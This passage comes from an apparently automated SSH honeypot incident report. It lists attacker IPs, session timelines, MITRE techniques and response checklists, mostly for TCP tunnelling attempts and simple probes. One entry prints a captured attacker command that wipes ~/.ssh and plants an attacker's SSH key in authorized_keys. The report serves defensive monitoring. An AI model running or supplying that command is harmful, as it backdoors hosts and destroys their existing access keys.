| `2026-07-10 14:32:11` | `cowrie.client.kex` |
| `2026-07-10 14:32:13` | `cowrie.login.success` |
| `2026-07-10 14:32:14` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d9de98c9d7

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-10 14:33 |
| **Last Seen** | 2026-07-10 14:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:33:14` | `cowrie.session.connect` |
| `2026-07-10 14:33:15` | `cowrie.client.version` |
| `2026-07-10 14:33:15` | `cowrie.client.kex` |
| `2026-07-10 14:33:16` | `cowrie.login.success` |
| `2026-07-10 14:33:17` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c50aff18ce5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:35 |
| **Last Seen** | 2026-07-10 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:35:41` | `cowrie.session.connect` |
| `2026-07-10 14:35:41` | `cowrie.client.version` |
| `2026-07-10 14:35:41` | `cowrie.client.kex` |
| `2026-07-10 14:35:41` | `cowrie.login.success` |
| `2026-07-10 14:35:41` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:35:41` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78280b19be9a

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-07-10 14:36 |
| **Last Seen** | 2026-07-10 14:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:36:37` | `cowrie.session.connect` |
| `2026-07-10 14:36:37` | `cowrie.client.version` |
| `2026-07-10 14:36:37` | `cowrie.client.kex` |
| `2026-07-10 14:36:38` | `cowrie.login.success` |
| `2026-07-10 14:36:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5042d8761eaa

| Field | Detail |
|---|---|
| **Source IP** | `94.205.250[.]78` |
| **First Seen** | 2026-07-10 14:36 |
| **Last Seen** | 2026-07-10 14:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:36:44` | `cowrie.session.connect` |
| `2026-07-10 14:36:44` | `cowrie.client.version` |
| `2026-07-10 14:36:44` | `cowrie.client.kex` |
| `2026-07-10 14:36:46` | `cowrie.login.success` |
| `2026-07-10 14:36:46` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.205.250[.]78` to AbuseIPDB if not already reported
- [ ] Block `94.205.250[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e61a05246f4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:42 |
| **Last Seen** | 2026-07-10 14:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:42:25` | `cowrie.session.connect` |
| `2026-07-10 14:42:25` | `cowrie.client.version` |
| `2026-07-10 14:42:25` | `cowrie.client.kex` |
| `2026-07-10 14:42:26` | `cowrie.login.success` |
| `2026-07-10 14:42:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:42:26` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffc11d0e42b7

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-10 14:45 |
| **Last Seen** | 2026-07-10 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:45:35` | `cowrie.session.connect` |
| `2026-07-10 14:45:35` | `cowrie.client.version` |
| `2026-07-10 14:45:35` | `cowrie.client.kex` |
| `2026-07-10 14:45:36` | `cowrie.login.success` |
| `2026-07-10 14:45:37` | `cowrie.session.params` |
| `2026-07-10 14:45:37` | `cowrie.command.input` |
| `2026-07-10 14:45:37` | `cowrie.command.failed` |
| `2026-07-10 14:45:37` | `cowrie.log.closed` |
| `2026-07-10 14:45:38` | `cowrie.session.params` |
| `2026-07-10 14:45:38` | `cowrie.command.input` |
| `2026-07-10 14:45:38` | `cowrie.session.file_download` |
| `2026-07-10 14:45:38` | `cowrie.log.closed` |
| `2026-07-10 14:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716599b11302

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-10 14:45 |
| **Last Seen** | 2026-07-10 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:45:38` | `cowrie.session.connect` |
| `2026-07-10 14:45:38` | `cowrie.client.version` |
| `2026-07-10 14:45:39` | `cowrie.client.kex` |
| `2026-07-10 14:45:40` | `cowrie.login.success` |
| `2026-07-10 14:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1bb5e213dc

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-10 14:45 |
| **Last Seen** | 2026-07-10 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:45:40` | `cowrie.session.connect` |
| `2026-07-10 14:45:40` | `cowrie.client.version` |
| `2026-07-10 14:45:40` | `cowrie.client.kex` |
| `2026-07-10 14:45:41` | `cowrie.login.success` |
| `2026-07-10 14:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f68bceb9ae6f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 14:46 |
| **Last Seen** | 2026-07-10 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:46:45` | `cowrie.session.connect` |
| `2026-07-10 14:46:45` | `cowrie.client.version` |
| `2026-07-10 14:46:45` | `cowrie.client.kex` |
| `2026-07-10 14:46:46` | `cowrie.login.success` |
| `2026-07-10 14:46:47` | `cowrie.session.params` |
| `2026-07-10 14:46:47` | `cowrie.command.input` |
| `2026-07-10 14:46:47` | `cowrie.log.closed` |
| `2026-07-10 14:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa99f2cc302a

| Field | Detail |
|---|---|
| **Source IP** | `106.12.38[.]73` |
| **First Seen** | 2026-07-10 14:47 |
| **Last Seen** | 2026-07-10 14:47 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:47:29` | `cowrie.session.connect` |
| `2026-07-10 14:47:29` | `cowrie.client.version` |
| `2026-07-10 14:47:29` | `cowrie.client.kex` |
| `2026-07-10 14:47:31` | `cowrie.login.success` |
| `2026-07-10 14:47:32` | `cowrie.client.size` |
| `2026-07-10 14:47:32` | `cowrie.session.params` |
| `2026-07-10 14:47:42` | `cowrie.log.closed` |
| `2026-07-10 14:47:43` | `cowrie.session.params` |
| `2026-07-10 14:47:43` | `cowrie.command.input` |
| `2026-07-10 14:47:44` | `cowrie.log.closed` |
| `2026-07-10 14:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.38[.]73` to AbuseIPDB if not already reported
- [ ] Block `106.12.38[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ade702cadde

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:52 |
| **Last Seen** | 2026-07-10 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:52:34` | `cowrie.session.connect` |
| `2026-07-10 14:52:34` | `cowrie.client.version` |
| `2026-07-10 14:52:35` | `cowrie.client.kex` |
| `2026-07-10 14:52:35` | `cowrie.login.success` |
| `2026-07-10 14:52:35` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:52:35` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3590ba929ddd

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-10 14:53 |
| **Last Seen** | 2026-07-10 14:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:53:37` | `cowrie.session.connect` |
| `2026-07-10 14:53:38` | `cowrie.client.version` |
| `2026-07-10 14:53:38` | `cowrie.client.kex` |
| `2026-07-10 14:53:39` | `cowrie.login.success` |
| `2026-07-10 14:53:39` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdc4da769d90

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-07-10 14:53 |
| **Last Seen** | 2026-07-10 14:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:53:45` | `cowrie.session.connect` |
| `2026-07-10 14:53:45` | `cowrie.client.version` |
| `2026-07-10 14:53:45` | `cowrie.client.kex` |
| `2026-07-10 14:53:49` | `cowrie.login.success` |
| `2026-07-10 14:53:49` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5905d7539160

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-10 14:53 |
| **Last Seen** | 2026-07-10 14:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:53:57` | `cowrie.session.connect` |
| `2026-07-10 14:53:59` | `cowrie.client.version` |
| `2026-07-10 14:53:59` | `cowrie.client.kex` |
| `2026-07-10 14:54:03` | `cowrie.login.success` |
| `2026-07-10 14:54:05` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c551df63f155

| Field | Detail |
|---|---|
| **Source IP** | `180.183.245[.]232` |
| **First Seen** | 2026-07-10 14:54 |
| **Last Seen** | 2026-07-10 14:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:54:15` | `cowrie.session.connect` |
| `2026-07-10 14:54:15` | `cowrie.client.version` |
| `2026-07-10 14:54:15` | `cowrie.client.kex` |
| `2026-07-10 14:54:18` | `cowrie.login.success` |
| `2026-07-10 14:54:18` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.183.245[.]232` to AbuseIPDB if not already reported
- [ ] Block `180.183.245[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbcc2a7265cf

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 14:54 |
| **Last Seen** | 2026-07-10 14:54 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:54:38` | `cowrie.session.connect` |
| `2026-07-10 14:54:40` | `cowrie.client.version` |
| `2026-07-10 14:54:40` | `cowrie.client.kex` |
| `2026-07-10 14:54:50` | `cowrie.login.success` |
| `2026-07-10 14:54:53` | `cowrie.session.params` |
| `2026-07-10 14:54:53` | `cowrie.command.input` |
| `2026-07-10 14:54:55` | `cowrie.log.closed` |
| `2026-07-10 14:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5aef476c07b

| Field | Detail |
|---|---|
| **Source IP** | `185.15.189[.]232` |
| **First Seen** | 2026-07-10 14:58 |
| **Last Seen** | 2026-07-10 14:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:58:51` | `cowrie.session.connect` |
| `2026-07-10 14:58:52` | `cowrie.client.version` |
| `2026-07-10 14:58:52` | `cowrie.client.kex` |
| `2026-07-10 14:58:53` | `cowrie.login.success` |
| `2026-07-10 14:58:53` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.189[.]232` to AbuseIPDB if not already reported
- [ ] Block `185.15.189[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25e7b449de9

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-07-10 14:58 |
| **Last Seen** | 2026-07-10 14:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:58:58` | `cowrie.session.connect` |
| `2026-07-10 14:58:58` | `cowrie.client.version` |
| `2026-07-10 14:58:58` | `cowrie.client.kex` |
| `2026-07-10 14:58:59` | `cowrie.login.success` |
| `2026-07-10 14:59:00` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7bc5bb635f

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-07-10 15:01 |
| **Last Seen** | 2026-07-10 15:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:01:12` | `cowrie.session.connect` |
| `2026-07-10 15:01:13` | `cowrie.client.version` |
| `2026-07-10 15:01:13` | `cowrie.client.kex` |
| `2026-07-10 15:01:14` | `cowrie.login.success` |
| `2026-07-10 15:01:14` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a815e46a09e7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:01 |
| **Last Seen** | 2026-07-10 15:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:01:57` | `cowrie.session.connect` |
| `2026-07-10 15:01:57` | `cowrie.client.version` |
| `2026-07-10 15:01:57` | `cowrie.client.kex` |
| `2026-07-10 15:01:57` | `cowrie.login.success` |
| `2026-07-10 15:01:58` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:01:58` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7523def2db0e

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-10 15:02 |
| **Last Seen** | 2026-07-10 15:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:02:28` | `cowrie.session.connect` |
| `2026-07-10 15:02:29` | `cowrie.client.version` |
| `2026-07-10 15:02:29` | `cowrie.client.kex` |
| `2026-07-10 15:02:31` | `cowrie.login.success` |
| `2026-07-10 15:02:32` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906446f7d573

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]50` |
| **First Seen** | 2026-07-10 15:02 |
| **Last Seen** | 2026-07-10 15:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:02:41` | `cowrie.session.connect` |
| `2026-07-10 15:02:42` | `cowrie.client.version` |
| `2026-07-10 15:02:42` | `cowrie.client.kex` |
| `2026-07-10 15:02:44` | `cowrie.login.success` |
| `2026-07-10 15:02:45` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8770eacffe

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 15:06 |
| **Last Seen** | 2026-07-10 15:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:06:04` | `cowrie.session.connect` |
| `2026-07-10 15:06:05` | `cowrie.client.version` |
| `2026-07-10 15:06:05` | `cowrie.client.kex` |
| `2026-07-10 15:06:08` | `cowrie.login.success` |
| `2026-07-10 15:06:10` | `cowrie.session.params` |
| `2026-07-10 15:06:10` | `cowrie.command.input` |
| `2026-07-10 15:06:10` | `cowrie.log.closed` |
| `2026-07-10 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e8f9159e5c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 15:08 |
| **Last Seen** | 2026-07-10 15:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:08:39` | `cowrie.session.connect` |
| `2026-07-10 15:08:39` | `cowrie.client.version` |
| `2026-07-10 15:08:39` | `cowrie.client.kex` |
| `2026-07-10 15:08:40` | `cowrie.login.success` |
| `2026-07-10 15:08:40` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:08:40` | `cowrie.direct-tcpip.data` |
| `2026-07-10 15:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
